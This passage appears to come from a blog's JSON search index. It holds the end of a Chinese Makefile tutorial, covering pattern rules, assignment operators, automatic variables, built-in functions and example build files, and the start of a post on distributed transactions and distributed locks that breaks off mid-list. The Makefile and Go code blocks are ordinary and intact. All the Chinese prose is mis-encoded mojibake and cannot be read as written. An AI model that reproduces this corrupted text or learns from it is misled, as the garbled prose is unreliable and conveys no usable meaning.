æ¨¡å¼åŒ¹é…\n\nMakeå‘½ä»¤å…è®¸å¯¹æ–‡ä»¶åï¼Œè¿›è¡Œç±»ä¼¼æ­£åˆ™è¿ç®—çš„åŒ¹é…ï¼Œä¸»è¦ç”¨åˆ°çš„åŒ¹é…ç¬¦æ˜¯%ã€‚æ¯”å¦‚ï¼Œå‡å®šå½“å‰ç›®å½•ä¸‹æœ‰ f1.c å’Œ f2.c ä¸¤ä¸ªæºç æ–‡ä»¶ï¼Œéœ€è¦å°†å®ƒä»¬ç¼–è¯‘ä¸ºå¯¹åº”çš„å¯¹è±¡æ–‡ä»¶ã€‚\n\n```\n%.o: %.c\n\nç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚\n\nf1.o: f1.c\nf2.o: f2.c\n```\n\nä½¿ç”¨åŒ¹é…ç¬¦%ï¼Œå¯ä»¥å°†å¤§é‡åŒç±»å‹çš„æ–‡ä»¶ï¼Œåªç”¨ä¸€æ¡è§„åˆ™å°±å®Œæˆæ„å»ºã€‚\n\n\n\n##### 2.5 å˜é‡å’Œèµ‹å€¼ç¬¦\n\nMakefile å…è®¸ä½¿ç”¨ç­‰å·è‡ªå®šä¹‰å˜é‡ã€‚\n\n```makefile\ntxt = Hello World\ntest:\n    @echo $(txt)\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡ txt ç­‰äº Hello Worldã€‚è°ƒç”¨æ—¶ï¼Œå˜é‡éœ€è¦æ”¾åœ¨ $( ) ä¹‹ä¸­ã€‚\n\n\n\nè°ƒç”¨Shellå˜é‡ï¼Œéœ€è¦åœ¨ç¾å…ƒç¬¦å·å‰ï¼Œå†åŠ ä¸€ä¸ªç¾å…ƒç¬¦å·ï¼Œè¿™æ˜¯å› ä¸ºMakeå‘½ä»¤ä¼šå¯¹ç¾å…ƒç¬¦å·è½¬ä¹‰ã€‚\n\n```makefile\ntest:\n    @echo $$HOME\n```\n\n\n\næœ‰æ—¶ï¼Œå˜é‡çš„å€¼å¯èƒ½æŒ‡å‘å¦ä¸€ä¸ªå˜é‡ã€‚\n\n```makefile\nv1 = $(v2)\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡ v1 çš„å€¼æ˜¯å¦ä¸€ä¸ªå˜é‡ v2ã€‚è¿™æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œv1 çš„å€¼åˆ°åº•åœ¨å®šä¹‰æ—¶æ‰©å±•ï¼ˆé™æ€æ‰©å±•ï¼‰ï¼Œè¿˜æ˜¯åœ¨è¿è¡Œæ—¶æ‰©å±•ï¼ˆåŠ¨æ€æ‰©å±•ï¼‰ï¼Ÿå¦‚æœ v2 çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œè¿™ä¸¤ç§æ‰©å±•æ–¹å¼çš„ç»“æœå¯èƒ½ä¼šå·®å¼‚å¾ˆå¤§ã€‚\n\nä¸ºäº†è§£å†³ç±»ä¼¼é—®é¢˜ï¼ŒMakefileä¸€å…±æä¾›äº†å››ä¸ªèµ‹å€¼è¿ç®—ç¬¦ ï¼ˆ=ã€:=ã€ï¼Ÿ=ã€+=ï¼‰ï¼Œå®ƒä»¬çš„åŒºåˆ«è¯·çœ‹[StackOverflow](http://stackoverflow.com/questions/448910/makefile-variable-assignment)ã€‚\n\n```bash\nVARIABLE = value\n# åœ¨æ‰§è¡Œæ—¶æ‰©å±•ï¼Œå…è®¸é€’å½’æ‰©å±•ã€‚\n\nVARIABLE := value\n# åœ¨å®šä¹‰æ—¶æ‰©å±•ã€‚\n\nVARIABLE ?= value\n# åªæœ‰åœ¨è¯¥å˜é‡ä¸ºç©ºæ—¶æ‰è®¾ç½®å€¼ã€‚\n\nVARIABLE += value\n# å°†å€¼è¿½åŠ åˆ°å˜é‡çš„å°¾ç«¯ã€‚\n```\n\n\n\n##### 2.6 å†…ç½®å˜é‡ï¼ˆImplicit Variablesï¼‰\n\nMakeå‘½ä»¤æä¾›ä¸€ç³»åˆ—å†…ç½®å˜é‡ï¼Œæ¯”å¦‚ï¼Œ`$(CC)` æŒ‡å‘å½“å‰ä½¿ç”¨çš„ç¼–è¯‘å™¨ï¼Œ`$(MAKE)` æŒ‡å‘å½“å‰ä½¿ç”¨çš„Makeå·¥å…·ã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº†è·¨å¹³å°çš„å…¼å®¹æ€§ï¼Œè¯¦ç»†çš„å†…ç½®å˜é‡æ¸…å•è§[æ‰‹å†Œ](https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html)ã€‚\n\n```makefile\noutput:\n    $(CC) -o output input.c\n```\n\n\n\n##### 2.7 è‡ªåŠ¨å˜é‡ï¼ˆAutomatic Variablesï¼‰\n\nMakeå‘½ä»¤è¿˜æä¾›ä¸€äº›è‡ªåŠ¨å˜é‡ï¼Œå®ƒä»¬çš„å€¼ä¸å½“å‰è§„åˆ™æœ‰å…³ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªã€‚\n\n+ ``$@``\n\n  `$@`æŒ‡ä»£å½“å‰ç›®æ ‡ï¼Œå°±æ˜¯Makeå‘½ä»¤å½“å‰æ„å»ºçš„é‚£ä¸ªç›®æ ‡ã€‚æ¯”å¦‚ï¼Œ`make foo`çš„`$@` å°±æŒ‡ä»£fooã€‚\n\n  ```bash\n  a.txt b.txt: \n      touch $@\n      \n  #ç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚    \n   \n  a.txt:\n      touch a.txt\n  b.txt:\n      touch b.txt\n  ```\n\n+ `$<`\n\n  `$<` æŒ‡ä»£ç¬¬ä¸€ä¸ªå‰ç½®æ¡ä»¶ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œé‚£ä¹ˆ`$<` å°±æŒ‡ä»£p1ã€‚\n\n  ```bash\n  a.txt: b.txt c.txt\n      cp $< $@ \n      \n  # ç­‰åŒäºä¸‹é¢çš„å†™æ³•ã€‚\n  \n  a.txt: b.txt c.txt\n      cp b.txt a.txt \n  ```\n\n  \n\n+ `$?`\n\n  `$?` æŒ‡ä»£æ¯”ç›®æ ‡æ›´æ–°çš„æ‰€æœ‰å‰ç½®æ¡ä»¶ï¼Œä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œå…¶ä¸­ p2 çš„æ—¶é—´æˆ³æ¯” t æ–°ï¼Œ`$?`å°±æŒ‡ä»£p2ã€‚\n\n  \n\n+ `$^`\n\n  `$^` æŒ‡ä»£æ‰€æœ‰å‰ç½®æ¡ä»¶ï¼Œä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚æ¯”å¦‚ï¼Œè§„åˆ™ä¸º t: p1 p2ï¼Œé‚£ä¹ˆ `$^` å°±æŒ‡ä»£ p1 p2 ã€‚\n\n  \n\n+ `$*`\n\n  `$*` æŒ‡ä»£åŒ¹é…ç¬¦ % åŒ¹é…çš„éƒ¨åˆ†ï¼Œ æ¯”å¦‚% åŒ¹é… f1.txt ä¸­çš„f1 ï¼Œ`$*` å°±è¡¨ç¤º f1ã€‚\n\n  \n\n+ `$(@D)` å’Œ `$(@F)`\n\n  `$(@D)` å’Œ `$(@F)` åˆ†åˆ«æŒ‡å‘ `$@` çš„ç›®å½•åå’Œæ–‡ä»¶åã€‚æ¯”å¦‚ï¼Œ`$@`æ˜¯ src/input.cï¼Œé‚£ä¹ˆ`$(@D)` çš„å€¼ä¸º src ï¼Œ`$(@F)` çš„å€¼ä¸º input.cã€‚\n\n  \n\n+ `$(<D)` å’Œ `$(<F)`\n\n  `$(<D)` å’Œ `$(<F)` åˆ†åˆ«æŒ‡å‘ `$<` çš„ç›®å½•åå’Œæ–‡ä»¶åã€‚\n\n\n\nä¸‹é¢æ˜¯è‡ªåŠ¨å˜é‡çš„ä¸€ä¸ªä¾‹å­ã€‚\n\n```makefile\ndest/%.txt: src/%.txt\n    @[ -d dest ] || mkdir dest\n    cp $< $@\n```\n\nä¸Šé¢ä»£ç å°† src ç›®å½•ä¸‹çš„ txt æ–‡ä»¶ï¼Œæ‹·è´åˆ° dest ç›®å½•ä¸‹ã€‚é¦–å…ˆåˆ¤æ–­ dest ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±æ–°å»ºï¼Œç„¶åï¼Œ`$<` æŒ‡ä»£å‰ç½®æ–‡ä»¶ï¼ˆsrc/%.txtï¼‰ï¼Œ `$@` æŒ‡ä»£ç›®æ ‡æ–‡ä»¶ï¼ˆdest/%.txtï¼‰ã€‚\n\n\n\n##### 2.8 åˆ¤æ–­å’Œå¾ªç¯\n\nMakefileä½¿ç”¨ Bash è¯­æ³•ï¼Œå®Œæˆåˆ¤æ–­å’Œå¾ªç¯ã€‚\n\n```makefile\nifeq ($(CC),gcc)\n  libs=$(libs_for_gcc)\nelse\n  libs=$(normal_libs)\nendif\n```\n\nä¸Šé¢ä»£ç åˆ¤æ–­å½“å‰ç¼–è¯‘å™¨æ˜¯å¦ gcc ï¼Œç„¶åæŒ‡å®šä¸åŒçš„åº“æ–‡ä»¶ã€‚\n\n\n\n```makefile\nLIST = one two three\nall:\n    for i in $(LIST); do \\\n        echo $$i; \\\n    done\n\n# ç­‰åŒäº\n\nall:\n    for i in one two three; do \\\n        echo $i; \\\n    done\n```\n\nä¸Šé¢ä»£ç çš„è¿è¡Œç»“æœã€‚\n\n```bash\none\ntwo\nthree\n```\n\n\n\n##### 2.9 å‡½æ•°\n\nMakefile è¿˜å¯ä»¥ä½¿ç”¨å‡½æ•°ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n```bash\n$(function arguments)\n# æˆ–è€…\n${function arguments}\n```\n\n\n\nMakefileæä¾›äº†è®¸å¤š[å†…ç½®å‡½æ•°](http://www.gnu.org/software/make/manual/html_node/Functions.html)ï¼Œå¯ä¾›è°ƒç”¨ã€‚ä¸‹é¢æ˜¯å‡ ä¸ªå¸¸ç”¨çš„å†…ç½®å‡½æ•°ã€‚\n\n+ shell å‡½æ•°\n\n  shell å‡½æ•°ç”¨æ¥æ‰§è¡Œ shell å‘½ä»¤\n\n  ```makefile\n  srcfiles := $(shell echo src/{00..99}.txt)\n  ```\n\n  \n\n+ wildcard å‡½æ•°\n\n  wildcard å‡½æ•°ç”¨æ¥åœ¨ Makefile ä¸­ï¼Œæ›¿æ¢ Bash çš„é€šé…ç¬¦ã€‚\n\n  ```makefile\n  srcfiles := $(wildcard src/*.txt)\n  ```\n\n  \n\n+ subst å‡½æ•°\n\n  subst å‡½æ•°ç”¨æ¥æ–‡æœ¬æ›¿æ¢ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n  ```makefile\n  $(subst from,to,text)\n  ```\n\n  ä¸‹é¢çš„ä¾‹å­å°†å­—ç¬¦ä¸²\"feet on the street\"æ›¿æ¢æˆ\"fEEt on the strEEt\"ã€‚\n\n  ```makefile\n  $(subst ee,EE,feet on the street)\n  ```\n\n  \n\n+ patsubstå‡½æ•°\n\n  patsubst å‡½æ•°ç”¨äºæ¨¡å¼åŒ¹é…çš„æ›¿æ¢ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚\n\n  ```makefile\n  $(patsubst pattern,replacement,text)\n  ```\n\n  ä¸‹é¢çš„ä¾‹å­å°†æ–‡ä»¶å\"x.c.c bar.c\"ï¼Œæ›¿æ¢æˆ\"x.c.o bar.o\"ã€‚\n\n  ```makefile\n  $(patsubst %.c,%.o,x.c.c bar.c)\n  ```\n\n  \n\n+ æ›¿æ¢åç¼€å\n\n  æ›¿æ¢åç¼€åå‡½æ•°çš„å†™æ³•æ˜¯ï¼šå˜é‡å + å†’å· + åç¼€åæ›¿æ¢è§„åˆ™ã€‚å®ƒå®é™…ä¸Špatsubstå‡½æ•°çš„ä¸€ç§ç®€å†™å½¢å¼ã€‚\n\n  ```makefile\n  min: $(OUTPUT:.js=.min.js)\n  ```\n\n  ä¸Šé¢ä»£ç çš„æ„æ€æ˜¯ï¼Œå°†å˜é‡OUTPUTä¸­çš„åç¼€å .js å…¨éƒ¨æ›¿æ¢æˆ .min.js ã€‚\n\n\n\n### 3. Makefile çš„å®ä¾‹\n\n##### 3.1  åˆ é™¤\n\n```makefile\n.PHONY: cleanall cleanobj cleandiff\n\ncleanall : cleanobj cleandiff\n        rm program\n\ncleanobj :\n        rm *.o\n\ncleandiff :\n        rm *.diff\n```\n\nä¸Šé¢ä»£ç å¯ä»¥è°ƒç”¨ä¸åŒç›®æ ‡ï¼Œåˆ é™¤ä¸åŒåç¼€åçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨ä¸€ä¸ªç›®æ ‡ï¼ˆcleanallï¼‰ï¼Œåˆ é™¤æ‰€æœ‰æŒ‡å®šç±»å‹çš„æ–‡ä»¶ã€‚\n\n##### 3.2 ç¼–è¯‘Cè¯­è¨€é¡¹ç›®\n\n```makefile\nedit : main.o kbd.o command.o display.o \n    cc -o edit main.o kbd.o command.o display.o\n\nmain.o : main.c defs.h\n    cc -c main.c\nkbd.o : kbd.c defs.h command.h\n    cc -c kbd.c\ncommand.o : command.c defs.h command.h\n    cc -c command.c\ndisplay.o : display.c defs.h\n    cc -c display.c\n\nclean :\n     rm edit main.o kbd.o command.o display.o\n\n.PHONY: edit clean\n```\n\n\n\n##### 3.3 é¡¹ç›®\n\n```makefile\n.SILENT :\n.PHONY : dep vet clean dist package test\n\nNAME := cistern\nPRE := oc\nROOF := fhyx.tech/oceans/$(NAME)\n\nWITH_ENV = env `cat .env 2>/dev/null | xargs`\nUNAME_S := $(shell uname -s)\nifeq ($(UNAME_S),Darwin)\n    HOST := $(shell scutil --get LocalHostName)\nelse\n    HOST := $(shell hostname)\nendif\n\nDATE := $(shell date '+%Y%m%dT%H%M')\nSTAMP := $(shell date +%s)\nUSER := $(shell echo ${USER})\nTAG:=$(shell git describe --tags --always)\nLDFLAGS:=-X $(ROOF)/settings.Name=$(NAME) -X $(ROOF)/cmd.version=$(TAG) -X $(ROOF)/cmd.built=$(DATE) -X $(ROOF)/cmd.buildStamp=$(STAMP) -X $(ROOF)/cmd.buildUser=$(USER) -X $(ROOF)/cmd.buildHost=$(HOST)\n\nCOMMANDS = vet clean dist\n.PHONY: $(COMMANDS)\n\nmain:\n\techo \"Building $(NAME)\"\n\tgo build -ldflags \"$(LDFLAGS)\" .\n\nhelp:\n\t@echo \"commands: $(COMMANDS)\"\n\nall: clean $(COMMANDS)\n\nvet:\n\techo \"Checking .\"\n\tgo vet -vettool=$(which shadow) -atomic -bool -copylocks -nilfunc -printf -rangeloops -unreachable -unsafeptr -unusedresult ./...\n\nclean:\n\techo \"Cleaning dist\"\n\trm -rf dist\n\trm -f $(NAME) $(NAME)-*\n\ndist/linux_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of linux\"\n\tmkdir -p dist/linux_amd64 && GOOS=linux GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -s -w\" -o dist/linux_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist/darwin_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of darwin\"\n\tmkdir -p dist/darwin_amd64 && GOOS=darwin GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -w\" -o dist/darwin_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist: clean dist/linux_amd64/$(NAME) dist/darwin_amd64/$(NAME)\n\npackage: dist\n\techo \"Packaging $(NAME)\"\n\tls dist/linux_amd64 | xargs tar -cvJf $(NAME)-linux-amd64-$(TAG).tar.xz -C dist/linux_amd64\n\n.PHONY: binary-deploy\nbinary-deploy:\n\t@echo \"copy binary to earth\"\n\t@scp dist/linux_amd64/??-* earth:dist/linux_amd64/\n\n.PHONY: package-upload\npackage-upload:\n\t@echo \"copy package.tar.?z to venus\"\n\t@scp *-linux-amd64-*.tar.?z gopkg:/var/www/gopkg/\n\ndocker-build: dist/linux_amd64/$(NAME)\n\techo \"Building docker image\"\n\tcp -rf Dockerfile* dist/\n\tdocker build -t fhyx/cistern:$(TAG) dist/\n\tdocker tag fhyx/cistern:$(TAG) fhyx/cistern:latest\n.PHONY: $@\n```\n\n\n\n```go\npackage cmd\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\n\t\"github.com/spf13/cobra\"\n)\n\nvar (\n\tversion   = \"dev\"\n\tbuilt     = \"N/A\"\n\tbuildUser = \"None\"\n\tname      = \"cistern\"\n)\n\nvar versionCmd = &cobra.Command{\n\tUse:   \"version\",\n\tShort: \"Print the version number\",\n\tLong:  ``,\n\tRun: func(cmd *cobra.Command, args []string) {\n\t\tfmt.Printf(\"%s %s built %s by %s (%s %s-%s)\\n\", name, version, built, buildUser, runtime.Version(), runtime.GOOS, runtime.GOARCH)\n\t},\n}\n\nfunc init() {\n\tRootCmd.AddCommand(versionCmd)\n}\n\nfunc inDevelop() bool {\n\treturn version == \"dev\"\n}\n```\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ http://www.ruanyifeng.com/blog/2015/02/make.html\n+ https://blog.csdn.net/ruglcc/article/details/7814546\n+ http://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets\n","tags":["makefile"],"categories":["shell"]},{"title":"åˆ†å¸ƒå¼äº‹åŠ¡å’Œåˆ†å¸ƒå¼é”","url":"%2Fp%2Fbb1dd10.html","content":"\n\n\n# 0. åˆ†å¸ƒå¼ç†è®º\n\nåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ ¸å¿ƒå°±æ˜¯è§£å†³ä¸€ä¸ªé—®é¢˜ï¼šä¸åŒèŠ‚ç‚¹é—´å¦‚ä½•è¾¾æˆå…±è¯†ã€‚\n\n### 0.1 ä¸€è‡´æ€§é—®é¢˜\n\nä¸€è‡´æ€§é—®é¢˜å°±æ˜¯ç›¸äº’ç‹¬ç«‹çš„èŠ‚ç‚¹ä¹‹é—´å¦‚ä½•è¾¾æˆä¸€é¡¹å†³è®®çš„é—®é¢˜ã€‚\n\nåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œè¿›è¡Œæ•°æ®åº“äº‹åŠ¡æäº¤(commit transaction)ã€Leaderé€‰ä¸¾ã€åºåˆ—å·ç”Ÿæˆç­‰éƒ½ä¼šé‡åˆ°ä¸€è‡´æ€§é—®é¢˜ã€‚\n\n<!-- more -->\n\nä¸€è‡´æ€§è¿˜å…·å¤‡ä¸¤ä¸ªå±æ€§\n\n+ ä¸€ä¸ªæ˜¯å¼ºä¸€è‡´(safety)ï¼Œå®ƒè¦æ±‚æ‰€æœ‰èŠ‚ç‚¹çŠ¶æ€ä¸€è‡´ã€å…±è¿›é€€ï¼›\n\n+ ä¸€ä¸ªæ˜¯å¯ç”¨(liveness)ï¼Œå®ƒè¦æ±‚åˆ†å¸ƒå¼ç³»ç»Ÿ24*7æ— é—´æ–­å¯¹å¤–æœåŠ¡ã€‚\n\nFLPå®šç†(FLP impossibility) å¦å®šäº†åŒæ—¶æ»¡è¶³safety å’Œ liveness çš„ä¸€è‡´æ€§åè®®çš„å­˜åœ¨ã€‚å·¥ç¨‹å®è·µä¸Šæ ¹æ®å…·ä½“çš„ä¸šåŠ¡åœºæ™¯ï¼Œæˆ–ä¿è¯å¼ºä¸€è‡´(safety)ï¼Œæˆ–åœ¨èŠ‚ç‚¹å®•æœºã€ç½‘ç»œåˆ†åŒ–çš„æ—¶å€™ä¿è¯å¯ç”¨(liveness)ã€‚\n\næ‰€ä»¥ CAP æ¨¡å‹, è¦ä¹ˆæ˜¯ CP, æˆ–è€…AP, CA ä¸å­˜åœ¨ã€‚\n\n\n\n# 1. å¼ºä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ\n\n### 1.1 XAä¸¤é˜¶æ®µæäº¤(2PC)\n\n2PC(tow phase commit)ä¸¤é˜¶æ®µæäº¤é¡¾åæ€ä¹‰å®ƒåˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼Œå…ˆç”±ä¸€æ–¹è¿›è¡Œæè®®(propose)å¹¶æ”¶é›†å…¶ä»–èŠ‚ç‚¹çš„åé¦ˆ(vote)ï¼Œå†æ ¹æ®åé¦ˆå†³å®šæäº¤(commit)æˆ–ä¸­æ­¢(abort)äº‹åŠ¡ã€‚\n\nåœ¨å¼‚æ­¥ç¯å¢ƒ(asynchronous)å¹¶ä¸”æ²¡æœ‰èŠ‚ç‚¹å®•æœº(fail-stop)çš„æ¨¡å‹ä¸‹ï¼Œ2PCå¯ä»¥æ»¡è¶³å…¨è®¤åŒã€å€¼åˆæ³•ã€å¯ç»“æŸï¼Œæ˜¯è§£å†³ä¸€è‡´æ€§é—®é¢˜çš„ä¸€ç§åè®®ã€‚\n\n##### 1.1.1 è§’è‰²\n\n+ æˆ‘ä»¬å°†æè®®çš„èŠ‚ç‚¹ç§°ä¸ºåè°ƒè€…(coordinator)\n+ å…¶ä»–å‚ä¸å†³è®®èŠ‚ç‚¹ç§°ä¸ºå‚ä¸è€…(participants, æˆ–cohorts)\n\n##### 1.1.2 æ‰§è¡Œè¿‡ç¨‹\n\n+ ç¬¬ä¸€é˜¶æ®µ\n\n  coordinatorå‘èµ·ä¸€ä¸ªæè®®ï¼Œåˆ†åˆ«é—®è¯¢å„participantæ˜¯å¦æ¥å—ã€‚participantæ‰§è¡Œæœ¬åœ°äº‹åŠ¡, ç»“æœç»™coordinatorã€‚\n\n+ ç¬¬äºŒé˜¶æ®µ\n\n  coordinatoræ ¹æ®participantçš„åé¦ˆï¼Œä¸‹è¾¾æäº¤æˆ–ä¸­æ­¢äº‹åŠ¡ï¼Œå¦‚æœparticipantå…¨éƒ¨åŒæ„åˆ™æäº¤ï¼Œåªè¦æœ‰ä¸€ä¸ªparticipantä¸åŒæ„å°±ä¸­æ­¢ã€‚\n\n##### 1.1.3 å®•æœºå¤„ç†\n\ncoordinatorå¦‚æœåœ¨å‘èµ·æè®®åå®•æœºï¼Œé‚£ä¹ˆparticipantå°†è¿›å…¥é˜»å¡(block)çŠ¶æ€ã€ä¸€ç›´ç­‰å¾…coordinatorå›åº”ä»¥å®Œæˆè¯¥æ¬¡å†³è®®ã€‚è¿™æ—¶éœ€è¦å¦ä¸€è§’è‰²æŠŠç³»ç»Ÿä»ä¸å¯ç»“æŸçš„çŠ¶æ€ä¸­å¸¦å‡ºæ¥ï¼Œæˆ‘ä»¬æŠŠæ–°å¢çš„è¿™ä¸€è§’è‰²å«åè°ƒè€…å¤‡ä»½(coordinator watchdog)ã€‚\n\ncoordinatorå®•æœºä¸€å®šæ—¶é—´åï¼Œcoordinator watchdogæ¥æ›¿åŸcoordinatorå·¥ä½œï¼Œé€šè¿‡é—®è¯¢(query) å„participantçš„çŠ¶æ€ï¼Œå†³å®šé˜¶æ®µ2æ˜¯æäº¤è¿˜æ˜¯ä¸­æ­¢ã€‚\n\nè¿™ä¹Ÿè¦æ±‚ coordinator/participant è®°å½•(logging)å†å²çŠ¶æ€ï¼Œä»¥å¤‡coordinatorå®•æœºåwatchdogå¯¹participantæŸ¥è¯¢ã€coordinatorå®•æœºæ¢å¤åé‡æ–°æ‰¾å›çŠ¶æ€ã€‚\n\n### 1.2 ä¸‰é˜¶æ®µæäº¤(3PC)\n\nç›¸æ¯”2PCï¼Œ3PCå¢åŠ äº†ä¸€ä¸ªå‡†å¤‡æäº¤(prepare to commit)é˜¶æ®µã€‚\n\nåœ¨2PCä¸­ä¸€ä¸ªparticipantçš„çŠ¶æ€åªæœ‰å®ƒè‡ªå·±å’ŒcoordinatorçŸ¥æ™“ï¼Œå‡å¦‚coordinatoræè®®åè‡ªèº«å®•æœºï¼Œåœ¨watchdogå¯ç”¨å‰ä¸€ä¸ªparticipantåˆå®•æœºï¼Œå…¶ä»–participantå°±ä¼šè¿›å…¥æ—¢ä¸èƒ½å›æ»šã€åˆä¸èƒ½å¼ºåˆ¶commitçš„é˜»å¡çŠ¶æ€ï¼Œç›´åˆ°participantå®•æœºæ¢å¤ã€‚\n\n##### 1.2.1 æ‰§è¡Œè¿‡ç¨‹\n\n+ ç¬¬ä¸€é˜¶æ®µ\n\n  cancommit æ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡\n\n+ ç¬¬äºŒé˜¶æ®µ\n\n  precommit å‡†å¤‡æäº¤é˜¶æ®µ  æ‰§è¡Œäº‹åŠ¡, ä¸æäº¤, è¿”å›ç»™åè°ƒè€…\n\n+ ç¬¬ä¸‰é˜¶æ®µ\n\n  docommit \n\n##### 1.2.2 å®•æœºå¤„ç†\n\n+ é˜¶æ®µ1: \n\n  coordinatoræˆ–watchdogæœªæ”¶åˆ°å®•æœºparticipantçš„voteï¼Œç›´æ¥ä¸­æ­¢äº‹åŠ¡ï¼›\n\nâ€‹\tå®•æœºçš„participantæ¢å¤åï¼Œè¯»å–loggingå‘ç°æœªå‘å‡ºèµæˆvoteï¼Œè‡ªè¡Œä¸­æ­¢è¯¥æ¬¡äº‹åŠ¡\n\n+ é˜¶æ®µ2: \n\n  coordinatoræœªæ”¶åˆ°å®•æœºparticipantçš„precommit ACKï¼Œä½†å› ä¸ºä¹‹å‰å·²ç»æ”¶åˆ°äº†å®•æœºparticipantçš„èµæˆåé¦ˆ(ä¸ç„¶ä¹Ÿä¸ä¼šè¿›å…¥åˆ°é˜¶æ®µ2)ï¼Œcoordinatorè¿›è¡Œcommitï¼›\n\n  å®•æœºçš„participantæ¢å¤åå‘ç°æ”¶åˆ°precommitæˆ–å·²ç»å‘å‡ºèµæˆvoteï¼Œåˆ™è‡ªè¡Œcommitè¯¥æ¬¡äº‹åŠ¡\n\n+ é˜¶æ®µ3: \n\n  å³ä¾¿coordinatoræˆ–watchdogæœªæ”¶åˆ°å®•æœºparticipantçš„commit ACKï¼Œä¹Ÿç»“æŸè¯¥æ¬¡äº‹åŠ¡ï¼›\n\n  å®•æœºçš„participantæ¢å¤åå‘ç°æ”¶åˆ°commitæˆ–è€…precommitï¼Œä¹Ÿå°†è‡ªè¡Œcommitè¯¥æ¬¡äº‹åŠ¡\n\n##### 1.2.3 æ€»ç»“\n\nå› ä¸ºæœ‰äº†å‡†å¤‡æäº¤(prepare to commit)é˜¶æ®µï¼Œ3PCçš„äº‹åŠ¡å¤„ç†å»¶æ—¶ä¹Ÿå¢åŠ äº†1ä¸ªRTTï¼Œå˜ä¸º3ä¸ªRTT(propose+precommit+commit)ï¼Œä½†æ˜¯å®ƒé˜²æ­¢participantå®•æœºåæ•´ä¸ªç³»ç»Ÿè¿›å…¥é˜»å¡æ€ï¼Œå¢å¼ºäº†ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œå¯¹ä¸€äº›ç°å®ä¸šåŠ¡åœºæ™¯æ˜¯éå¸¸å€¼å¾—çš„ã€‚\n\n### 1.3 TCC è¡¥å¿æœºåˆ¶\n\nä¸šåŠ¡ä¾µå…¥, ä¸šåŠ¡çš„å›æ»š, æœ‰å¯èƒ½æ•°æ®åº“ä¸æ”¯æŒäº‹åŠ¡\n\n+ ç¬¬ä¸€é˜¶æ®µ\n\n  Try, è¯•è¯•æ˜¯å¦å¯æ‰§è¡Œ\n\n+ ç¬¬äºŒé˜¶æ®µ\n\n  Confirm, æ‰§è¡Œä¸šåŠ¡, ç›´æ¥æäº¤, try æˆåŠŸ, confirm ä¹Ÿå°±æˆåŠŸ\n\n+ ç¬¬ä¸‰é˜¶æ®µ\n\n  Cancel, ä¸šåŠ¡å‡ºé”™äº†, åœ¨å›æ»š, å•ç‹¬ä¸€ä¸ªæ–¹æ³•\n\n  \n\n# 2. æœ€ç»ˆä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ\n\n### 2.1 æœ¬åœ°æ¶ˆæ¯è¡¨\n\n+ Aæ‰§è¡Œäº‹åŠ¡æˆåŠŸ, å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—\n+ Bä»æ¶ˆæ¯é˜Ÿåˆ—å–å‡ºæ•°æ®, æ‰§è¡Œäº‹åŠ¡\n+ B æ‰§è¡ŒæˆåŠŸæˆ–å¤±è´¥, é€šçŸ¥ A, å†³å®šæäº¤è¿˜æ˜¯å›æ»š\n\n### 2.2 MQ æ¶ˆæ¯é˜Ÿåˆ—\n\nRabbitMQ å’Œ Kafka ä¸æ”¯æŒäº‹åŠ¡æ¶ˆæ¯,  RocketMQ æ”¯æŒ\n\n+ Aå…ˆå‘é€æ¶ˆæ¯åˆ°äº‹åŠ¡é˜Ÿåˆ—, çŠ¶æ€ä¸ºPrepare, è¿™ä¸ªæ¶ˆæ¯ä¸ä¼šè¢«æ¶ˆè´¹\n+ Aæ‰§è¡Œæœ¬åœ°äº‹åŠ¡æˆåŠŸäº†, å‘é€Confirm, æŠŠé˜Ÿåˆ—æ”¹æˆå¯æ¶ˆè´¹çŠ¶æ€\n+ Bæ‹¿åˆ°æ¶ˆæ¯å, å¼€å§‹æ‰§è¡Œäº‹åŠ¡, å‘é€ACK, ä¿®æ”¹é˜Ÿåˆ—çš„çŠ¶æ€\n+ Açœ‹é˜Ÿåˆ—çš„çŠ¶æ€å†³å®šæäº¤è¿˜æ˜¯å›æ»š\n\n### 2.3 Seata\n\n\n+ XA å’Œ ATä¸¤é˜¶æ®µæäº¤\nXA äº‹åŠ¡æ˜¯æ•°æ®åº“çš„äº‹åŠ¡\nAT çš„äº‹åŠ¡å’Œæ•°æ®åº“æœ‰äº†è„±ç¦»\n\n\n\n# 3. åˆ†å¸ƒå¼é”\n\n### 3.1 æ•°æ®åº“\n\nå¼€é”€è¾ƒå¤§\n\n##### 3.1.2 è¡¨çš„ä¸»é”®æ¥å®ç°\n\n+ 